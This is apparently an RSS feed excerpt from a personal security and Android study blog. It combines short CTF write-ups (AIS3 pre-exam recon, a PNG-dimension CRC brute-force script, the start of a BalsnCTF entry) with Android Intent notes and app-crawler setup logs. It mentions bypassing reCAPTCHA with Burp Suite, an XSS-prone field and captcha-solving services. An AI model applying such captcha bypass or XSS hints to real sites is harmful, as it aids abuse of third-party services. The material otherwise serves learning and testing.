&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="web">
 Web
 &lt;a class="anchor" href="#web">#&lt;/a>
&lt;/h2>
&lt;h3 id="e-portfolio-baby">
 E-Portfolio baby
 &lt;a class="anchor" href="#e-portfolio-baby">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS&lt;/p>
&lt;h3 id="login-panel">
 Login Panel
 &lt;a class="anchor" href="#login-panel">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-1">
 Recon
 &lt;a class="anchor" href="#recon-1">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://www.readfog.com/a/1640970212456108032">我又找到了一個破解谷歌驗證碼的新方案！&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://yescaptcha.com/dashboard.html">yescaptcha&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h2 id="pwn">
 Pwn
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="simply-pwn">
 Simply Pwn
 &lt;a class="anchor" href="#simply-pwn">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon-2">
 Recon
 &lt;a class="anchor" href="#recon-2">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>&lt;code>checksec&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec pwn
[*] Checking for new versions of pwntools
 To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to &amp;#39;never&amp;#39; (old way).
 Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
 [update]
 interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] &amp;#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX disabled
 PIE: No PIE (0x400000)
 RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="welcome">
 Welcome
 &lt;a class="anchor" href="#welcome">#&lt;/a>
&lt;/h3>
&lt;p>縮小檔案就看的到flag了
Flag: &lt;code>AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;amp;-MY-FIRST-CTF}&lt;/code>&lt;/p></description></item><item><title>Android Related</title><link>https://bernie6401.github.io/docs/terminology/android-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/android-related/</guid><description>&lt;h1 id="android-related">
 Android Related
 &lt;a class="anchor" href="#android-related">#&lt;/a>
&lt;/h1>
&lt;h2 id="android-app本身">
 Android App本身
 &lt;a class="anchor" href="#android-app%e6%9c%ac%e8%ba%ab">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://ironglion.com/archives/334">[Android] Activity基本介紹&lt;/a>
:::spoiler&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>
&lt;p>什麼是Activity?
Activity是App中，提供畫面的一個元件，
例如：使用Google地圖App時，顯示地圖的那個畫面。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>只有Activity可以顯示畫面嗎？
不是，除了Activity以外還有其他元件可以顯示畫面，
例如：Dialog，但每一個App至少要有一個Activity，但這有個例外，如果這個App不提供介面的話也是可以不用有Activity的。&lt;/p>
&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;hr>
&lt;blockquote>
&lt;p>Activity其他注意事項&lt;/p>
&lt;ul>
&lt;li>兩個Activity傳遞資訊是透過Intent
&lt;pre tabindex="0">&lt;code class="language-kotlin!" data-lang="kotlin!">Intent intent = new Intent(this, TwoActivity.class);
startActivity(intent);
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Intent 能傳遞的資訊大小要小於512k&lt;/li>
&lt;li>每一個Activity都要在AndroidManifest中聲明
&lt;pre tabindex="0">&lt;code class="language-kotlin!" data-lang="kotlin!">&amp;lt;manifest ... &amp;gt;
 &amp;lt;application ... &amp;gt;
 &amp;lt;activity android:name=&amp;#34;.MainActivity&amp;#34; /&amp;gt;
 ...
 &amp;lt;/application ... &amp;gt;
 ...
&amp;lt;/manifest &amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10231988">Android基本(2)-Intent基本觀念與使用釐清&lt;/a>
:::spoiler&lt;/p>
&lt;blockquote>
&lt;p>我們該如何從一個 activity 去啟動另外一個 activity，又或者我們要怎麼進行兩個 activity 間的資料通等等的問題，這時候最常見的方式就是使用我們今天的主角 Intent&lt;/p>
&lt;h3 id="種類">
 種類
 &lt;a class="anchor" href="#%e7%a8%ae%e9%a1%9e">#&lt;/a>
&lt;/h3>
&lt;p>下方名稱網路上對他們的名稱有些需的差異，在這邊以 android doc 上名稱為主。&lt;/p>
&lt;ol>
&lt;li>明確意圖(Explicit intents)：官方的說明有點冗長，講白一點就是在指定啟動元件的時候，我們直接使用名稱(完整的類別名稱)進行指定。
例如：
&lt;code>Intent intent = new Intent(FirstActivity.this, SecondActivity.class);&lt;/code>&lt;/li>
&lt;li>隱含意圖(Implicit intents)：在宣告的時候不指定給特定的元件，而是針對功能、動作進行宣告，來讓定一個應用程式的元件進行處理。
例如：在APP中開啟網頁，系統發現手機上有chrome以及預設瀏覽器提供網頁瀏覽的功能，這時候便會跳出選單讓使用者選擇。&lt;/li>
&lt;/ol>
&lt;h3 id="範例">
 範例
 &lt;a class="anchor" href="#%e7%af%84%e4%be%8b">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>明確意圖範例
&lt;code>Intent intent = new Intent(FirstActivity.this, SecondActivity.class);&lt;/code>
&lt;code>startActivity(intent);&lt;/code>&lt;/p></description></item><item><title>App Crawler Overview</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/app-crawler-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/app-crawler-overview/</guid><description>&lt;h1 id="android-app-crawler">
 Android App Crawler
 &lt;a class="anchor" href="#android-app-crawler">#&lt;/a>
&lt;/h1>
&lt;p>目前僅針對以下功能進行查找&lt;/p>
&lt;ol>
&lt;li>可以自行判斷目前activity有哪些可以interact&lt;/li>
&lt;li>自行與這些interactable的view進行interact，不管是DFS或是BFS，反正就是全部都互動就對了&lt;/li>
&lt;/ol>
&lt;h2 id="比較常見的">
 比較常見的
 &lt;a class="anchor" href="#%e6%af%94%e8%bc%83%e5%b8%b8%e8%a6%8b%e7%9a%84">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://developer.android.com/studio/test/other-testing-tools/app-crawler">App Crawler&lt;/a> &lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/seveniruby/AppCrawler">seveniruby/AppCrawler&lt;/a> &lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>&lt;sup id="fnref:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup>&lt;sup id="fnref:7">&lt;a href="#fn:7" class="footnote-ref" role="doc-noteref">7&lt;/a>&lt;/sup>&lt;sup id="fnref:8">&lt;a href="#fn:8" class="footnote-ref" role="doc-noteref">8&lt;/a>&lt;/sup>&lt;sup id="fnref:9">&lt;a href="#fn:9" class="footnote-ref" role="doc-noteref">9&lt;/a>&lt;/sup> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/zhangzhao4444/Maxim">zhangzhao4444/Maxim&lt;/a> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/Eaway/AppCrawler">Eaway/AppCrawler&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/isonic1/Appium-Native-Crawler">isonic1/Appium-Native-Crawler&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="根據paper-related-work">
 根據Paper Related Work
 &lt;a class="anchor" href="#%e6%a0%b9%e6%93%9apaper-related-work">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://github.com/tingsu/Stoat">Stoat&lt;/a>
:::info
Ting Su, Guozhu Meng, Yuting Chen, Ke Wu, Weiming Yang, Yao Yao, Geguang Pu, Yang Liu, and Zhendong Su. 2017. Guided, stochastic model-based GUI testing of Android apps. In Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering (ESEC/FSE 2017). Association for Computing Machinery, New York, NY, USA, 245–256. &lt;a href="https://doi.org/10.1145/3106237.3106298">https://doi.org/10.1145/3106237.3106298&lt;/a>
:::
詳細的說明(包含Demo影片、比較的工具、測試的App)，都可以參考 &lt;a href="https://tingsu.github.io/files/stoat.html">https://tingsu.github.io/files/stoat.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/studio/test/other-testing-tools/monkey">UI/Application Exerciser Monkey&lt;/a> - 不會採用
這是上一篇所比較的對象之一，可以想像成一個猴子正在對一個手機上的App進行隨機互動，可能包含簡單的click, double click, long click或是swipe等等
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell monkey -p com.music.spotify -v &lt;span style="color:#ae81ff">50000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>最後面的數字代表隨機丟出多少的event給特定的App&lt;/li>
&lt;li>&lt;a href="https://github.com/tanzirul/a3e">a3e&lt;/a> - 年代久遠不採用
也是第一篇的比較對象之一&lt;/li>
&lt;li>&lt;a href="https://github.com/Rhapsod/sapienz">Sapienz&lt;/a> - 無法使用
也是第一篇的比較對象之一&lt;/li>
&lt;li>&lt;a href="http://gutianxiao.com/ape/">APE - official webpage&lt;/a> / &lt;a href="https://github.com/tianxiaogu/ape">APE - github&lt;/a> - github star太少且年代久遠不採用
這是第一篇有提到的工具之一&lt;/li>
&lt;li>&lt;a href="https://github.com/bytedance/Fastbot_Android">Fastbot Android&lt;/a> - 可採用
這是前一個APE官網有提到的工具，而且開發時間還蠻近的，github star也很多，也有&lt;a href="https://blog.csdn.net/u010698107/article/details/127347704">CSDN教學&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/honeynet/droidbot">Droidbot&lt;/a> - 可能採用
:::info
Li, Y., Yang, Z., Guo, Y., &amp;amp; Chen, X. (2017, May). Droidbot: a lightweight ui-guided test input generator for android. In 2017 IEEE/ACM 39th International Conference on Software Engineering Companion (ICSE-C) (pp. 23-26). IEEE.
:::
年代有點久遠，但網路上的&lt;a href="https://juejin.cn/post/7316582773434204171">教學&lt;/a>也蠻多的，官網也有提供&lt;a href="http://honeynet.github.io/droidbot/report_com.yelp.android/">範例&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/google-deepmind/android_env">Androidenv&lt;/a> - 可能採用
:::info
Toyama, D., Hamel, P., Gergely, A., Comanici, G., Glaese, A., Ahmed, Z., &amp;hellip; &amp;amp; Precup, D. (2021). Androidenv: A reinforcement learning platform for android. arXiv preprint arXiv:2105.13231.
:::
年代較近，也有教學&lt;/li>
&lt;/ol>
&lt;h2 id="實驗的來源以及標準">
 實驗的來源以及標準
 &lt;a class="anchor" href="#%e5%af%a6%e9%a9%97%e7%9a%84%e4%be%86%e6%ba%90%e4%bb%a5%e5%8f%8a%e6%a8%99%e6%ba%96">#&lt;/a>
&lt;/h2>
&lt;p>如果僅僅是要app本身是開源的可以從&lt;a href="https://f-droid.org/zh_Hant/">F-Droid&lt;/a>當中去找，這個網站就是一個免費的Google Play Store，但是我要找的除了是app本身開源，後端本身也要開源，k因為這樣我才知道後端的URL有多少，如果想要知道有哪些可能可以拿來實驗的App，可以看&lt;code>Guided, stochastic model-based GUI testing of Android apps.&lt;/code>這一篇論文(就是前面提到的第一篇)&lt;/p></description></item><item><title>App Crawler 無法使用紀錄</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/</guid><description>&lt;h1 id="app-crawler-無法使用紀錄">
 App Crawler 無法使用紀錄
 &lt;a class="anchor" href="#app-crawler-%e7%84%a1%e6%b3%95%e4%bd%bf%e7%94%a8%e7%b4%80%e9%8c%84">#&lt;/a>
&lt;/h1>
&lt;p>根據&lt;a href="https://developer.android.com/studio/test/other-testing-tools/app-crawler">Android Studio官網&lt;/a>的說明&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ java -jar crawl_launcher.jar --apk-file path/to/my/app.apk --android-sdk path/to/my/android/sdk
&lt;/code>&lt;/pre>&lt;p>我已經有安裝app在手機了，所以實際的command如下&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ java -jar crawl_launcher.jar --app-package-name com.xueqiu.android --android-sdk C:\Users\Bernie\AppData\Local\Android\Sdk
Preparing to crawl com.xueqiu.android
Crawl started.
Crawl finished.
Writing logcat to D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\com.xueqiu.android-logcat.txt
SUCCESS: Found 0 crashes.
Timed out waiting for crawl outputs proto file D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\app_firebase_test_lab\crawl_outputs.proto
The output directory is D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output
&lt;/code>&lt;/pre>&lt;p>但全程就只有大約不到30秒就結束了，不太懂流程到底出錯在哪，而且就算沒有安裝app，再重新跑一次，居然還可以沒有出錯的跑完；又或者是，把在沒有安裝app的情況下，用官網的command跑會直接當掉，無法繼續往下繼續跑，就一整個就很怪，但網路上也沒有比較新的說明&lt;/p></description></item><item><title>AppCrawler</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/appcrawler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/appcrawler/</guid><description>&lt;h1 id="appcrawler">
 AppCrawler
 &lt;a class="anchor" href="#appcrawler">#&lt;/a>
&lt;/h1>
&lt;p>前面踩了超多坑，所以一切都以底下最新的配置為主&lt;/p>
&lt;h2 id="infra">
 Infra
 &lt;a class="anchor" href="#infra">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Appium - 1.22.3
一定要是2.0.0以下(未包含)，所以不要用default latest version，可以用CLI也可以用Desktop，因為Desktop Version預設已經no longer supported，所以一定是1.22.3，而CLI安裝就需要指定(以下是已經安裝npm為前提)
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ npm install -g appium@1.22.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ npm install -g appium-doctor
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定ANDROID_HOME和JAVA_HOME
到Windows環境變數設定
&lt;img src="https://hackmd.io/_uploads/BkmODXjqR.png" alt="圖片" />
然後去看appium-doctor看necessary的部分是不是都有，一般來說可能會apkanalyzer.bat會沒有，這方面就慢慢到網路上去載android studio下載tools
&lt;img src="https://hackmd.io/_uploads/BkZsw7j9R.png" alt="圖片" />&lt;/li>
&lt;li>AppCrawler - latest (2.7.4)
就直接到github release去下載build好的jar file，不需要看其他教學是用2.4.0或是2.3.1去用stb或是maven build原本的專案
Official Link: &lt;a href="https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4">https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="測試前">
 測試前
 &lt;a class="anchor" href="#%e6%b8%ac%e8%a9%a6%e5%89%8d">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>app activity name
如果已經在手機安裝好，就直接看dumpsys中該package的main activity是哪一個
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell dumpsys package com.spotify.music | grep -B &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span> -n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>279- Action: &lt;span style="color:#e6db74">&amp;#34;com.google.android.meet.ADDONS_SUPPORT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>280- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.DEFAULT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>281: android.intent.action.MAIN:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>282- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>283: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>286- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.APP_MUSIC&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>287- 7cd1a0c com.spotify.music/.main.AppIconEmeraldGreen filter 18bef55
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>288: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>290- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.DEFAULT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>291- c3efd6a com.spotify.music/.MainActivity filter 204625b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>292: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>307- android.intent.action.MUSIC_PLAYER:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>308- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>309: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>另外一種方式就是用apktool反編譯後去看AndroidManifest.xml，一樣就是string search ==android.intent.action.MAIN==，但反編譯後會有一大堆files，可能會很佔空間
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ apktool d your_app.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>app package name
如果已經安裝了，就直接list package
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell pm list package | grep spotify
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package:com.spotify.music
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>要不然就要用aapt去看
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aapt d badging Spotify.apk | findstr package
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.spotify.music&amp;#39;&lt;/span> versionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;116658084&amp;#39;&lt;/span> versionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;8.9.58.572&amp;#39;&lt;/span> platformBuildVersionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span> platformBuildVersionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersion&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersionCodename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uses-permission: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.sec.android.app.clockpackage.permission.READ_ALARM&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>開啟appium
如何檢視有正確開啟並且有連線到
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ appium
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Appium&lt;span style="color:#f92672">]&lt;/span> Welcome to Appium v1.22.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Appium&lt;span style="color:#f92672">]&lt;/span> Appium REST http interface listener started on 0.0.0.0:4723
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl http://127.0.0.1:4723/wd/hub/status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;build&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;version&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;1.22.3&amp;#34;&lt;/span>&lt;span style="color:#f92672">}}&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;sessionId&amp;#34;&lt;/span>:null,&lt;span style="color:#e6db74">&amp;#34;status&amp;#34;&lt;/span>:0&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="實際測試">
 實際測試
 &lt;a class="anchor" href="#%e5%af%a6%e9%9a%9b%e6%b8%ac%e8%a9%a6">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ java -jar appcrawler-2.7.4-hogwarts.jar --capability &lt;span style="color:#e6db74">&amp;#34;appPackage=com.spotify.music,appActivity=MainActivity&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="注意事項">
 注意事項
 &lt;a class="anchor" href="#%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a0%85">#&lt;/a>
&lt;/h2>
&lt;p>:::danger
基本上這個tool還是依照大量截圖的方式判斷有無換頁，所以依照現在android版本的更新，開發商如果設定成無法截圖的方式，就無法做後續的測試
:::
:::danger
根據以上的步驟，還是非常有可能會遇到問題，我自己在用physical device時，最常遇到&lt;a href="https://ceshiren.com/t/topic/16293">java.lang.RuntimeException: Error creating extended parser class: Could not determine whether class ‘org.pegdown.Parser$$parboiled’ has already been loaded&lt;/a>，在使用emulator的時候，也會遇到&lt;a href="https://ceshiren.com/t/topic/31983">Exception in thread “main” java.awt.image.RasterFormatException: (y + height) is outside of Raster&lt;/a>&lt;/p></description></item><item><title>Background</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</guid><description>&lt;h1 id="nisra---看不見的地方">
 NISRA - 看不見的地方
 &lt;a class="anchor" href="#nisra---%e7%9c%8b%e4%b8%8d%e8%a6%8b%e7%9a%84%e5%9c%b0%e6%96%b9">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這題出的不錯，我用了所有方法都沒看到甚麼奇怪的東西，除了pngcheck&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck flag.png
flag.png CRC error in chunk IHDR (computed 68ff0ded, expected 8c5880da)
ERROR: flag.png 
&lt;/code>&lt;/pre>&lt;p>代表檔案可能有一些問題
原圖：
&lt;img src="https://hackmd.io/_uploads/SkwQ2IPu3.png" alt="" />&lt;/p>
&lt;h2 id="exploit---recover-png-file">
 Exploit - Recover PNG File
 &lt;a class="anchor" href="#exploit---recover-png-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>參考&lt;a href="https://zhuanlan.zhihu.com/p/599657891">UP主的腳本&lt;/a>，可以直接寫出長寬&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import zlib
import struct
import sys

filename = sys.argv[1]
with open(filename, &amp;#39;rb&amp;#39;) as f:
 all_b = f.read()
 crc32key = int(all_b[29:33].hex(),16)
 data = bytearray(all_b[12:29])
 n = 4095
 for w in range(n): 
 width = bytearray(struct.pack(&amp;#39;&amp;gt;i&amp;#39;, w))
 for h in range(n):
 height = bytearray(struct.pack(&amp;#39;&amp;gt;i&amp;#39;, h))
 for x in range(4):
 data[x+4] = width[x]
 data[x+8] = height[x]
 crc32result = zlib.crc32(data)
 if crc32result == crc32key:
 print(&amp;#34;寬為：{}(hex), {}(int)&amp;#34;.format(width.hex(), int(width.hex(), 16)))
 print(&amp;#34;高為：{}(hex), {}(int)&amp;#34;.format(height.hex(), int(height.hex(), 16)))
 exit(0)
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py flag.png
寬為：00000258(hex), 600(int)
高為：00000148(hex), 328(int)
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://hackmd.io/_uploads/rkLuiLwuh.png" alt="" />
可以看得出來高的數值不一樣&lt;/p></description></item><item><title>BalsnCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/balsnctf-2023/</guid><description>&lt;h1 id="balsnctf-2023">
 BalsnCTF 2023
 &lt;a class="anchor" href="#balsnctf-2023">#&lt;/a>
&lt;/h1>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="lucky">
 Lucky
 &lt;a class="anchor" href="#lucky">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA Main Function&lt;/p>
